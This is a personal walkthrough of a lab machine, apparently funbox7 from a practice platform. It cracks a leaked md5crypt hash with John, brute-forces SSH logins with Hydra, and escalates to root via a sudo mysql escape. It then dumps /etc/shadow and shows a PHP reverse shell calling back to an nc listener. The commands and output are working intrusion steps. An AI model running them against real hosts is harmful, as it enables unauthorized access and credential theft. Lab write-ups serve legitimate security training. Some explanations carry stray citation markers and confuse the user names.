+
+**Normally, password hashes should not be visible in `/etc/passwd`.**
+
+The line you found:
+
+```
+oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
+```
+
+means the **password hash is stored directly in `/etc/passwd` instead of `/etc/shadow`**.
+
+## How it should normally work
+
+### `/etc/passwd`
+
+```
+oracle:x:1004:1004:,,,:/home/oracle:/bin/bash
+```
+
+The `x` means:
+
+> "The actual password hash is stored in `/etc/shadow`."
+
+Anyone can read `/etc/passwd` because many programs need information like usernames, UIDs, home directories, and login shells.
+
+Permissions:
+
+```
+-rw-r--r--  root root  /etc/passwd
+```
+
+So every user can read it.
+
+---
+
+### `/etc/shadow`
+
+```
+oracle:$6$abc123$M5w8...:19950:0:99999:7:::
+```
+
+Only root can read this file.
+
+Permissions:
+
+```
+-r--------  root shadow  /etc/shadow
+```
+
+This protects password hashes from normal users.
+
+---
+
+# Why was the hash in `/etc/passwd`?
+
+There are several possibilities.
+
+### 1. Old Unix systems
+
+Years ago, Unix stored password hashes directly in `/etc/passwd`.
+
+Like this:
+
+```
+root:hashedpassword:0:0:...
+```
+
+Attackers could read the hashes and crack them offline.
+
+This security problem led to the introduction of `/etc/shadow`.
+
+---
+
+### 2. Configuration mistake (most likely in labs)
+
+Someone may have created the user incorrectly.
+
+For example:
+
+```
+useradd -p '$1$hash...' oracle
+```
+
+or manually edited `/etc/passwd`.
+
+Instead of placing the hash in `/etc/shadow`, it ended up in `/etc/passwd`.
+
+
+so soemoene isnated of doing the add user command 
+it direclty added the user in the `/etc/passwd` file and created a user
+
+# How should the user have been created?
+
+Correctly:
+
+```
+useradd oracle
+passwd oracle
+```
+
+Result:
+
+**/etc/passwd**
+
+```
+oracle:x:1004:1004:...
+```
+
+**/etc/shadow**
+
+```
+oracle:$6$randomsalt$verylonghash...
+```
+
+----------
+
+
+so now well crack he hash 
+
+```
+nano hash.txt
+```
+
+and put the hash int he file 
+
+now well run john the ripper  to crack the hash 
+
+first well have to unzip the rockyou.txt wordlist
+
+```bash
+└─$ ls -al /usr/share/wordlists     
+total 52124
+drwxr-xr-x   2 root root     4096 Jul 12 09:29 .
+drwxr-xr-x 360 root root    12288 Jul 13 15:21 ..
+lrwxrwxrwx   1 root root       25 Jul 12 09:29 dirb -> /usr/share/dirb/wordlists
+lrwxrwxrwx   1 root root       30 Jul 12 09:29 dirbuster -> /usr/share/dirbuster/wordlists
+lrwxrwxrwx   1 root root       35 Jul 12 09:29 dnsmap.txt -> /usr/share/dnsmap/wordlist_TLAs.txt
+lrwxrwxrwx   1 root root       41 Jul 12 09:29 fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
+lrwxrwxrwx   1 root root       45 Jul 12 09:29 fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
+lrwxrwxrwx   1 root root       28 Jul 12 09:29 john.lst -> /usr/share/john/password.lst
+lrwxrwxrwx   1 root root       27 Jul 12 09:29 legion -> /usr/share/legion/wordlists
+lrwxrwxrwx   1 root root       46 Jul 12 09:29 metasploit -> /usr/share/metasploit-framework/data/wordlists
+lrwxrwxrwx   1 root root       41 Jul 12 09:29 nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
+-rw-r--r--   1 root root 53357329 May  7 06:16 rockyou.txt.gz
+lrwxrwxrwx   1 root root       39 Jul 12 09:29 sqlmap.txt -> /usr/share/sqlmap/data/txt/wordlist.txt
+lrwxrwxrwx   1 root root       25 Jul 12 09:29 wfuzz -> /usr/share/wfuzz/wordlist
+lrwxrwxrwx   1 root root       37 Jul 12 09:29 wifite.txt -> /usr/share/dict/wordlist-probable.txt
+```
+
+```
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 
+```
+
+now run john 
+
+```
+john hash.txt -wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+```bash
+└─$ john hash.txt -wordlist=/usr/share/wordlists/rockyou.txt
+Created directory: /home/kali/.john
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hiphop           (?)     
+1g 0:00:00:00 DONE (2026-07-14 02:02) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..michael1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+we;ve got the passowrd as 
+
+```
+hiphop 
+```
+
+now well switch to user oracle on our reverse shell
+
+```
+www-data@funbox7:/var/www/html$ su oracle
+su oracle
+Password: hiphop
+
+oracle@funbox7:/var/www/html$ 
+```
+
+now well see how many commands can user oracle run on sudo right
+
+```bash
+oracle@funbox7:/var/www/html$ sudo -l
+sudo -l
+[sudo] password for oracle: hiphop
+
+Sorry, user oracle may not run sudo on funbox7.
+```
+
+weve found it cannot run `sudo`
+that means it has limites pemrissions
+
+well now hceck how many usera are there by deafult 
+
+```
+oracle@funbox7:/var/www/html$ ls /home
+ls /home
+goat  harry  karla  oracle  sally
+```
+
+also , form our ealier nmap results
+we know that ssh is also open i.e port 22
+
+```
+22/tcp open  ssh
+```
+
+ssh is `secure shell` use dto login into any shell
+
+now for the users we have 
+
+```
+goat  harry  karla  oracle  sally
+```
+
+they might have default login crdentials also 
+
+liek they might be havign same password as their suername 
+
+so well try this for all users
+
+so well generate a wordlist for these users only
+
+come back to kali terminal and 
+
+```
+nano users.txt
+```
+
+![](attachments/Pasted%20image%2020260714125419.png)
+
+### Your scenario
+
+- Usernames: **5**
+- Password list: **rockyou.txt (~14.3 million passwords)**
+- Service: **SSH**
+
+That means, in the worst case, you'll attempt:
+
+```
+5 × 14,344,391 ≈ 71.7 million login attempts
+```
+
+### How long would that take?
+
+The limiting factor is **how many SSH login attempts per second the server allows**.
+
+|Login rate|Approximate time for 71.7 million attempts|
+|---|---|
+|1 attempt/sec|~830 days|
+|5 attempts/sec|~166 days|
+|10 attempts/sec|~83 days|
+|50 attempts/sec|~17 days|
+|100 attempts/sec|~8 days|
+
+### In reality
+
+SSH is **not designed for fast brute forcing**:
+
+- Each attempt requires a full SSH authentication exchange.
+- Many servers introduce delays after failed logins.
+- Some disconnect clients after several failures.
+- Tools like Hydra or Medusa are often limited by the server, not by your hardware.
+
+So using the **entire RockYou list** against SSH is usually impractical.
+
+now you might ask how we got the password of user `oracle`  so fast  then 
+because it was runnning locally at that time 
+
+but for ssh brute ofrce ithe rquest will first go to hte server and then coma back 
+so it will tkaemore time
+
+so why not make the `users.txt` itself as our password fiel 
+since we are just checking for default credentials
+
+well use hydra here now 
+
+well see the mnaual of hydra now 
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ hydra -h
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
+
+Options:
+  -R        restore a previous aborted/crashed session
+  -I        ignore an existing restore file (don't wait 10 seconds)
+  -S        perform an SSL connect
+  -s PORT   if the service is on a different default port, define it here
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
+  -y        disable use of symbols in bruteforce, see above
+  -r        use a non-random shuffling method for option -x
+  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
+  -u        loop around users, not passwords (effective! implied with -x)
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -D XofY   Divide wordlist into Y segments and use the Xth segment.
+  -o FILE   write found login/password pairs to FILE instead of stdout
+  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
+  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
+  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
+  -c TIME   wait time per login attempt over all threads (enforces -t 1)
+  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
+  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
+  -O        use old SSL v2 and v3
+  -K        do not redo failed attempts (good for -M mass scanning)
+  -q        do not print messages about connection errors
+  -U        service module usage details
+  -m OPT    options specific for a module, see -U output for information
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+
+Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smb2 smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+
+Hydra is a tool to guess/crack valid login/password pairs.
+Licensed under AGPL v3.0. The newest version is always available at;
+https://github.com/vanhauser-thc/thc-hydra
+Please don't use in military or secret service organizations, or for illegal
+purposes. (This is a wish and non-binding - most such people do not care about
+laws and ethics anyway - and tell themselves they are one of the good ones.)
+These services were not compiled in: afp ncp oracle sapr3.
+
+Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
+E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
+     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
+     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
+     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
+
+Examples:
+  hydra -l user -P passlist.txt ftp://192.168.0.1
+  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
+  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
+  hydra -l admin -p password ftp://[192.168.0.0/24]/
+  hydra -L logins.txt -P pws.txt -M targets.txt ssh
+```
+
+so well use the command now 
+
+in this command , well modify the ipa ddrsess
+and put ip adress of trget 
+
+```shell
+oracle@funbox7:/var/www/html$ ip a
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:ab:db:22 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.153.132/24 brd 192.168.153.255 scope global ens192
+       valid_lft forever preferred_lft forever
+```
+
+add username will also be list  will be `users.txt`
+add password list  will be `users.txt`
+and server will be `ssh`
+- `-l` = **single username**
+- `-L` = **username list**
+
+
+```
+hydra -L users.txt -P users.txt ssh://192.168.153.132
+```
+
+## If you want to test `username == password` only
+
+Hydra has a shortcut:
+
+```
+hydra -L users.txt -e s -t 4 ssh://192.168.153.132
+```
+
+The `-e s` option tells Hydra to try the username itself as the password.
+
+now well run the command 
+
+```bash
+└─$ hydra -L users.txt -P users.txt ssh://192.168.153.132
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-14 05:48:10
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
+[DATA] attacking ssh://192.168.153.132:22/
+[22][ssh] host: 192.168.153.132   login: goat   password: goat
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-14 05:48:16
+```
+
+it has found that user `goad` has deafult password as `goat`
+
+so well login now to user goat 
+
+```
+oracle@funbox7:/var/www/html$ su goat
+su goat
+Password: goat
+
+goat@funbox7:/var/www/html$ whoami
+whoami
+goat
+```
+
+now well run `sudo -l` to check what prvileges we have
+
+```
+goat@funbox7:/var/www/html$ sudo -l
+sudo -l
+Matching Defaults entries for goat on funbox7:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User goat may run the following commands on funbox7:
+    (root) NOPASSWD: /usr/bin/mysql
+```
+
+he output actually shows a specific sudoer rule for the oracle user [47]: `User oracle may run the following commands : (root) NOPASSWD: /usr/bin/mysql` [47-49]
+
+This tells us that the user `oracle` is permitted to run **MySQL as the root user without entering a password** [47]! This is another critical misconfiguration [48].
+
+How can we abuse MySQL to escape our low-privileged shell and drop into a root command line? [47]
+
+GTFOBins is a catalog of Unix binaries that can be abused to bypass system security restrictions [48].
+We go to **GTFOBins** and search for `mysql` under the "Sudo" category [47-48].
+
+
+```
+https://gtfobins.org/#mysql
+```
+
+![](attachments/Pasted%20image%2020260714163047.png)
+
+after click ong oshell well go to sudo since it was sudo binary 
+
+![](attachments/Pasted%20image%2020260714163148.png)
+
+now well copy the command 
+and run it in our user
+
+```
+sudo /usr/bin/mysql -e '\! /bin/sh'
+```
+
+```
+goat@funbox7:/var/www/html$ sudo /usr/bin/mysql -e '\! /bin/sh'
+sudo /usr/bin/mysql -e '\! /bin/sh'
+# whoami
+whoami
+root
+```
+
+we have now attained root 
+
+Look at our prompt now [48]! We are **`root`** [51]! We have successfully taken over the entire machine [48]!
+
+Once you have a root shell, do not press `Ctrl + C` [52]! Pressing `Ctrl + C` will completely kill your active reverse shell, and you will have to set up your listener and trigger the exploit all over again to get back in [52].
+
+now well run 
+```
+cat /etc/shadow
+```
+to see the passwords of all users
+
+```
+# cat /etc/shadow
+cat /etc/shadow
+root:$6$QsFQoOcf$PDbk4PuGmKiF6vO7naCR3SHt2phGNK3VfgauXTK3tEAQ0TnNCJTtj05s2B1AL/Z6VrKLuQ8ruUWuLgLuP8vT71:18674:0:99999:7:::
+daemon:*:18480:0:99999:7:::
+bin:*:18480:0:99999:7:::
+sys:*:18480:0:99999:7:::
+sync:*:18480:0:99999:7:::
+games:*:18480:0:99999:7:::
+man:*:18480:0:99999:7:::
+lp:*:18480:0:99999:7:::
+mail:*:18480:0:99999:7:::
+news:*:18480:0:99999:7:::
+uucp:*:18480:0:99999:7:::
+proxy:*:18480:0:99999:7:::
+www-data:*:18480:0:99999:7:::
+backup:*:18480:0:99999:7:::
+list:*:18480:0:99999:7:::
+irc:*:18480:0:99999:7:::
+gnats:*:18480:0:99999:7:::
+nobody:*:18480:0:99999:7:::
+systemd-network:*:18480:0:99999:7:::
+systemd-resolve:*:18480:0:99999:7:::
+syslog:*:18480:0:99999:7:::
+messagebus:*:18480:0:99999:7:::
+_apt:*:18480:0:99999:7:::
+lxd:*:18480:0:99999:7:::
+uuidd:*:18480:0:99999:7:::
+dnsmasq:*:18480:0:99999:7:::
+landscape:*:18480:0:99999:7:::
+pollinate:*:18480:0:99999:7:::
+sshd:*:18523:0:99999:7:::
+karla:$6$3BbRbY6RnAAHMSY5$DMtzaijjLePQs2PNQP1NEj0GQwZxZ6zhhCVGD55eiVVF8i9IVu.t0QxOyYh2WgjaaiPKSOwDhAIhSv4L4qFVk/:18523:0:99999:7:::
+mysql:!:18523:0:99999:7:::
+harry:$6$SEUHOU5Y$BqNxc9Vx.50yikVXt0fpl4VWEmushoGPJaYI9.av3FnA4fM8UGxZcuj1o042BaX6tFxxd3T4towaeZWku2s1/.:18523:0:99999:7:::
+sally:$6$bbpLxjoM$kTLBsKFGl7xBu/1ELvsQCimo4A8cKx3qgBohDaq4732Ux2bwpCTUyXlX4D9cYNNCo5ziqwxK7piHuaav7ozDT0:18523:0:99999:7:::
+goat:$6$s3XAnXK6$hmPVWdFO4/4E5RHB1pLhLbk6yCnbcd006jYvnLIZInpLUW4D64tW09jeV4TC0V5pShmP.6yILCmfbxMAU9zi6/:18655:0:99999:7:::
+oracle:$6$Yp0m4etu$y/zFDtp2oFnAN7dYF43z3ug/JNTx.pVnOLjnBvCj6Se1FPQcGM4KYiNYeumQhP9WjlYVSoaZ2yTZChujKHMUF0:18523:0:99999:7:::
+lissy:!:18524:0:99999:7:::
+```
+
+so we found passwors for : 
+
+weeve found password of even root 
+
+```
+root:$6$QsFQoOcf$PDbk4PuGmKiF6vO7naCR3SHt2phGNK3VfgauXTK3tEAQ0TnNCJTtj05s2B1AL/Z6VrKLuQ8ruUWuLgLuP8vT71:18674:0:99999:7:::
+
+karla:$6$3BbRbY6RnAAHMSY5$DMtzaijjLePQs2PNQP1NEj0GQwZxZ6zhhCVGD55eiVVF8i9IVu.t0QxOyYh2WgjaaiPKSOwDhAIhSv4L4qFVk/:18523:0:99999:7:::
+
+harry:$6$SEUHOU5Y$BqNxc9Vx.50yikVXt0fpl4VWEmushoGPJaYI9.av3FnA4fM8UGxZcuj1o042BaX6tFxxd3T4towaeZWku2s1/.:18523:0:99999:7:::
+
+sally:$6$bbpLxjoM$kTLBsKFGl7xBu/1ELvsQCimo4A8cKx3qgBohDaq4732Ux2bwpCTUyXlX4D9cYNNCo5ziqwxK7piHuaav7ozDT0:18523:0:99999:7:::
+
+goat:$6$s3XAnXK6$hmPVWdFO4/4E5RHB1pLhLbk6yCnbcd006jYvnLIZInpLUW4D64tW09jeV4TC0V5pShmP.6yILCmfbxMAU9zi6/:18655:0:99999:7:::
+
+oracle:$6$Yp0m4etu$y/zFDtp2oFnAN7dYF43z3ug/JNTx.pVnOLjnBvCj6Se1FPQcGM4KYiNYeumQhP9WjlYVSoaZ2yTZChujKHMUF0:18523:0:99999:7:::
+
+lissy:!:18524:0:99999:7:::
+```
+
+```
+lissy:!:18524:0:99999:7:::
+```
+
+Let's break it down:
+
+|Field|Value|Meaning|
+|---|---|---|
+|Username|`lissy`|User account|
+|Password|`!`|**Account is locked** (no password authentication allowed)|
+|Last password change|`18524`|Days since Jan 1, 1970 when the password was last changed|
+|Minimum age|`0`|Password can be changed immediately|
+|Maximum age|`99999`|Password effectively never expires|
+|Warning|`7`|Warn user 7 days before expiration|
+|Inactive|_(empty)_|No inactivity period configured|
+|Expiration|_(empty)_|Account does not expire|
+|Reserved|_(empty)_|Reserved field|
+
+### The important part: `!`
+
+The second field is:
+
+```
+!
+```
+
+This **is not a password hash**.
+
+It means the account is **locked**.
+
+Examples:
+
+|Password field|Meaning|
+|---|---|
+|`$6$...`|Valid SHA-512 password hash|
+|`$1$...`|Valid MD5-Crypt hash|
+|`!`|Account locked|
+|`!!`|Password has never been set (common for new accounts)|
+|`*`|Login disabled (often for system/service accounts)|
+|`x`|Placeholder used in `/etc/passwd`; actual hash is in `/etc/shadow`|
+
+### Can you crack it?
+
+**No.**
+
+There is no password hash to crack. `!` is simply a marker that prevents password-based authentication.
+
+### Can the account still be used?
+
+Possibly, depending on the system configuration:
+
+- ❌ Password login via SSH or `su` will not work while the account is locked.
+- ✅ Other authentication methods (such as SSH public keys) may still work if they are configured and permitted.
+
+
+and once you becoem root you can switch to any user 
+
+now well go to the root home direcotry and see the flag 
+
+```
+# cd /root
+cd /root
+
+# ls
+ls
+proof.txt  root.flag
+
+# cat proof.txt
+cat proof.txt
+c540afecac9b1afa6e6bf0d53c7027e0
+```
+
+now weve got `proof.txt`
+
+now well searchfor `local.txt`
+
+```
+find / -name local.txt 2>/dev/null
+```
+
+```
+# find / -name local.txt 2>/dev/null
+find / -name local.txt 2>/dev/null
+/var/www/local.txt
+```
+
+now well read the file 
+
+```
+cat /var/www/local.txt
+```
+
+```
+# cat /var/www/local.txt
+cat /var/www/local.txt
+5ffd9f86a24da38c354a01a579af57dd
+```
+
+so finally weve got both flags i.e 
+
+```
+proof.txt : c540afecac9b1afa6e6bf0d53c7027e0
+
+local.txt : 5ffd9f86a24da38c354a01a579af57dd
+```
+
+
+----------
+
+
+
+#  **Alternative Exploitation - Direct PHP Reverse Shell**
+
+Now that you've completed this, let's look at an alternative way to exploit this machine [56].
+
+Previously, we uploaded a generic web shell (`web_shell.php`) and used URL command execution parameters to trigger a reverse shell [61].
+
+However, we can skip the web shell entirely and upload a dedicated **PHP reverse shell** script [59]. This script will immediately dial back and hand us an interactive shell the moment we visit the uploaded page [59, 61].
+
+so in the tsartign itslef well uplaod a PHP reverse shell** script 
+
+![](attachments/Pasted%20image%2020260714170633.png)
+
+now we can copy the code from our hack tools extnesiion 
+
+![](attachments/Pasted%20image%2020260714170741.png)
+
+or we can copy from `https://www.revshells.com/`
+Reverse Shell Generator
+
+![](attachments/Pasted%20image%2020260714170835.png)
+
+or we can direclty use form our linux mahcine 
+
+You don't need to write this script from scratch [59]. Kali Linux has pre-made PHP reverse shells built directly into the system [59]. You can locate them by running: `locate php-reverse-shell.php` [59].
+
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ locate php-reverse-shell.php 
+/usr/share/laudanum/php/php-reverse-shell.php
+/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
+/usr/share/webshells/php/php-reverse-shell.php
+```
+
+now well copy any of these and copy it  to our current folder
+
+```
+cp /usr/share/webshells/php/php-reverse-shell.php .
+```
+
+well check using ls 
+
+```
+└─$ ls    
+php-reverse-shell.php
+```
+
+Now, open the file using nano [
+
+```
+nano php-reverse-shell.php 
+```
+
+Scroll down to the configuration block [60]. We need to modify two variables [60]:
+
+1. **`$ip`:** Change this to your Kali Linux VPN IP (`tun0`) [60].
+2. **`$port`:** Change this to your chosen listening port (e.g., `1234`) [60].
+
+![539](attachments/Pasted%20image%2020260714171453.png)
+
+![](attachments/Pasted%20image%2020260714171538.png)
+
+
+Save the file and exit [60].
+
+Next, start your Netcat listener on your Kali machine using the corresponding port 
+
+```
+└─$ rlwrap -cAr nc -lvnp 1234
+listening on [any] 1234 ...
+```
+
+Now, go to the `mini.php` page in your browser, upload your modified `php-reverse-shell.php` file, 
+
+![](attachments/Pasted%20image%2020260714171907.png)
+
+now well exucte the file by going to 
+
+```
+http://192.168.153.132/php-reverse-shell.php
+```
+
+Look at your browser—the page hangs and keeps loading [61]. This is a good sign! It means the server's execution process has redirected its traffic back to your Netcat listener [61].
+
+![](attachments/Pasted%20image%2020260714172009.png)
+
+Check your terminal—the connection has been caught [61]! This is a direct reverse shell, bypasses the web shell command execution phase entirely [61].
+
+```
+└─$ rlwrap -cAr nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.45.246] from (UNKNOWN) [192.168.153.132] 48456
+Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 11:49:44 up  8:30,  0 users,  load average: 0.04, 0.01, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ bash -i
+bash: cannot set terminal process group (1332): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@funbox7:/$ 
+```
+
+now we can repeat the same psteps as previosu methos agagin
+
